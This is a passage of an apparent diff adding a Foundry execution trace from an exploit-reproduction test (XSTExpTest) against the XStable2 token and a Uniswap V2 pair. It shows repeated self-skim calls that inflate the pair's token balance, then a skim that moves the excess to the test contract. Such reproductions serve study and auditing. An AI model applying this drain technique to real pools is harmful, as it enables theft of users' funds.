+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1387509594927907 [1.387e15]
+    │   │   │   │   └─ ← [Return] 1387509594927907 [1.387e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1011667878499105 [1.011e15])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1011667878499105 [1.011e15]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1387509594927907 [1.387e15]
+    │   │   │   │   │   │   └─ ← [Return] 1387509594927907 [1.387e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 1011667878499105 [1.011e15])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 17451270904109 [1.745e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 17451270904109 [1.745e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x152ed05cd224e8ba91768a5b15830b8642177e64419cd434463e5b012c48273c → 0x1564fe48dbc1f8aee1fbb7bfaaa59ba7757feb7b66c4762bcedf142f5da23365
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x152ed05cd224e8ba91768a5b15830b8642177e64419cd434463e5b012c48273c → 0x1564fe48dbc1f8aee1fbb7bfaaa59ba7757feb7b66c4762bcedf142f5da23365
+    │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000000000000000000000048d86a435be557 → 0x000000000000000000000000000000000000000000000000004b5349e37bd475
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000004bbe8dd551f44 → 0x0000000000000000000000000000000000000000000000000004edeec0873323
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1434746484495725 [1.434e15]
+    │   │   │   │   └─ ← [Return] 1434746484495725 [1.434e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1058904768066923 [1.058e15])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1058904768066923 [1.058e15]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1434746484495725 [1.434e15]
+    │   │   │   │   │   │   └─ ← [Return] 1434746484495725 [1.434e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 1058904768066923 [1.058e15])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 15555311042903 [1.555e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 15555311042903 [1.555e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000004b5349e37bd475 → 0x000000000000000000000000000000000000000000000000004d8930030c0a10
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x1564fe48dbc1f8aee1fbb7bfaaa59ba7757feb7b66c4762bcedf142f5da23365 → 0x1593b24ceed8cb59bd322f1a2effe583794fd5f0304bcb53926965e4041f571f
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x1564fe48dbc1f8aee1fbb7bfaaa59ba7757feb7b66c4762bcedf142f5da23365 → 0x1593b24ceed8cb59bd322f1a2effe583794fd5f0304bcb53926965e4041f571f
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x0000000000000000000000000000000000000000000000000004edeec0873323 → 0x000000000000000000000000000000000000000000000000000518e4f28d156d
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1476851412782274 [1.476e15]
+    │   │   │   │   └─ ← [Return] 1476851412782274 [1.476e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1101009696353472 [1.101e15])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1101009696353472 [1.101e15]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1476851412782274 [1.476e15]
+    │   │   │   │   │   │   └─ ← [Return] 1476851412782274 [1.476e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 1101009696353472 [1.101e15])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 13443328392475 [1.344e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 13443328392475 [1.344e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x1593b24ceed8cb59bd322f1a2effe583794fd5f0304bcb53926965e4041f571f → 0x15bae86f0f8a00ca340b853a162825c555fc9e902f852d386a49eb09472192c1
+    │   │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000004d8930030c0a10 → 0x000000000000000000000000000000000000000000000000004f7240c395966b
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x1593b24ceed8cb59bd322f1a2effe583794fd5f0304bcb53926965e4041f571f → 0x15bae86f0f8a00ca340b853a162825c555fc9e902f852d386a49eb09472192c1
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x000000000000000000000000000000000000000000000000000518e4f28d156d → 0x00000000000000000000000000000000000000000000000000053f3043d84cc2
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1513239651907584 [1.513e15]
+    │   │   │   │   └─ ← [Return] 1513239651907584 [1.513e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1137397935478782 [1.137e15])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1137397935478782 [1.137e15]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1513239651907584 [1.513e15]
+    │   │   │   │   │   │   └─ ← [Return] 1513239651907584 [1.513e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 1137397935478782 [1.137e15])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 12511377290266 [1.251e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 12511377290266 [1.251e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x15bae86f0f8a00ca340b853a162825c555fc9e902f852d386a49eb09472192c1 → 0x15de8607bb0421ad2959f801dc34b0870e4b29a2dd63acbd52fc001ded456ab7
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x15bae86f0f8a00ca340b853a162825c555fc9e902f852d386a49eb09472192c1 → 0x15de8607bb0421ad2959f801dc34b0870e4b29a2dd63acbd52fc001ded456ab7
+    │   │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000004f7240c395966b → 0x0000000000000000000000000000000000000000000000000051396a0b8bba93
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x00000000000000000000000000000000000000000000000000053f3043d84cc2 → 0x000000000000000000000000000000000000000000000000000560488fe97800
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1547105297031600 [1.547e15]
+    │   │   │   │   └─ ← [Return] 1547105297031600 [1.547e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1171263580602798 [1.171e15])
+    │   │   │   │   ├─ [25015] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 1171263580602798 [1.171e15]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1547105297031600 [1.547e15]
+    │   │   │   │   │   │   └─ ← [Return] 1547105297031600 [1.547e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 1171263580602798 [1.171e15])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 10801978372109 [1.08e13])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 10801978372109 [1.08e13])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x15de8607bb0421ad2959f801dc34b0870e4b29a2dd63acbd52fc001ded456ab7 → 0x15fc99994130e2a4190fa2275d297c293c03cc4f551d5273cc20264744b52840
+    │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000000000000000000000051396a0b8bba93 → 0x0000000000000000000000000000000000000000000000000052c2634ee53ca7
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x000000000000000000000000000000000000000000000000000560488fe97800 → 0x00000000000000000000000000000000000000000000000000057f1585a8e1b0
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x15de8607bb0421ad2959f801dc34b0870e4b29a2dd63acbd52fc001ded456ab7 → 0x15fc99994130e2a4190fa2275d297c293c03cc4f551d5273cc20264744b52840
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39174] UniswapV2Pair::skim(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 1576343961784499 [1.576e15]
+    │   │   │   │   └─ ← [Return] 1576343961784499 [1.576e15]
+    │   │   │   ├─ [25794] AdminUpgradeabilityProxy::fallback(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1200502245355697 [1.2e15])
+    │   │   │   │   ├─ [25015] XStable2::transfer(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1200502245355697 [1.2e15]) [delegatecall]
+    │   │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1576343961784499 [1.576e15]
+    │   │   │   │   │   │   └─ ← [Return] 1576343961784499 [1.576e15]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1200502245355697 [1.2e15])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x16a17E12031Db06932cD3b2Eb7450112B7c91289, value: 9679049353180 [9.679e12])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x3363Defd7447f14b7f696c0843AA96516Bc04808, value: 9679049353180 [9.679e12])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x00000000000000000000000000000000000000000000000000057f1585a8e1b0 → 0x000000000000000000000000000000000000000000000000000599ad2de2d0b3
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x17a0e47abc6c971295df6de64af5f7da14667260ae994012e3f0e649ae753fce → 0x2471815ca654a54d5125f072ffa48edbf2cbc3c19fdcc7aa32f45fbbca40295e
+    │   │   │   │   │   │   @ 0xdb16803f220d395e24f000d39eb2ca00d9475aa950bbd2a574e3c78e0373353d: 0x15fc99994130e2a4190fa2275d297c293c03cc4f551d5273cc20264744b52840 → 0x16170cc89480356ac8737c1e1661c19fc5ae6587adbb40f9cc11d729523d3c00
+    │   │   │   │   │   │   @ 0x1a670d8dd5e8e6b20e2134ca2c3f077cc605eda824aae5201b15d148921a9532: 0x10d3acf3332b184bf855284c7e0c6f67a98d2ed761fd31df26d5e428a4d1ba56 → 0x0403101149430a113d0ea5bfc95dd865cb27dd7670b9aa47d7d26ab68906d0c6
+    │   │   │   │   │   │   @ 0x6179dbd0cf728e0e0d51fc1f2237102b1e10a6ef7b1987d3b8e9c954f828bc98: 0x15fc99994130e2a4190fa2275d297c293c03cc4f551d5273cc20264744b52840 → 0x16170cc89480356ac8737c1e1661c19fc5ae6587adbb40f9cc11d729523d3c00
+    │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000000000000000000000052c2634ee53ca7 → 0x000000000000000000000000000000000000000000000000005422827ad57713
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   ├─ [3262] WETH9::transfer(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [1949] XStable2::balanceOf(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 3470766087099226 [3.47e15]
+    │   │   │   └─ ← [Return] 3470766087099226 [3.47e15]
+    │   │   ├─ [27513] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 3470766087099226 [3.47e15])
+    │   │   │   ├─ [26734] XStable2::transfer(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], 3470766087099226 [3.47e15]) [delegatecall]
+    │   │   │   │   ├─ [388] UniswapV2Pair::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 72957050803213999 [7.295e16]
+    │   │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 382088276660357 [3.82e14]
+    │   │   │   │   │   └─ ← [Return] 382088276660357 [3.82e14]
+    │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 116989676722055111610 [1.169e20]
+    │   │   │   │   ├─ emit Transfer(from: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], value: 3418704595792738 [3.418e15])
+    │   │   │   │   ├─ emit Transfer(from: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 34707660870992 [3.47e13])
+    │   │   │   │   ├─ emit Transfer(from: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xDC958664Bc528A55723740b2F32F11CA8B601c83, value: 17353830435496 [1.735e13])
+    │   │   │   │   ├─  storage changes:
